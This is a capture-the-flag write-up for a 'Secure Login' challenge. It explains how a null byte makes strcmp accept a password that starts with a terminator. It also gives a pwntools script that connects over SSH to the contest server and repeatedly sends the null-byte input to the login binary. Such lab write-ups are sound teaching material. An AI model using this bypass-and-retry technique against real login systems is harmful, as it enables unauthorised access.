# Secure Login

## Description

My login is, potentially, and I don't say this lightly, if you know me you know that's the truth, it's truly, and no this isn't snake oil, this is, no joke, the most secure login service in the world (source).

Try to hack me at /problems/2021/secure_login on the shell server.

## Solution

Let's take a look to the code:

![image](https://user-images.githubusercontent.com/72620139/114243744-6d697b80-998d-11eb-8a49-1560e698e80c.png)


The function fgets, doesn't seem vulnerable... But strcmp starts comparing the first character of each string. If they are equal to each other, it continues with the following pairs until the characters differ or until a terminating null-character is reached. 
So if the two strings starts with the string terminator the function will return 0 because the two strings match up to the null character.

We reach our goal! Let's write the script:
````
from pwn import *

#connection
conn = ssh(host='shell.actf.co', user='team', password='pw')
conn = conn.shell('/bin/bash')
conn.sendline('cd /problems/2021/secure_login')

#waiting for the magic
for x in range(1000):
	conn.sendline('./login')
	conn.recvuntil(': ')
	conn.sendline(b'\x00')
	print(conn.recvline())

conn.interactive()
conn.close()
````


#### **FLAG >>** `FLAG QUI`
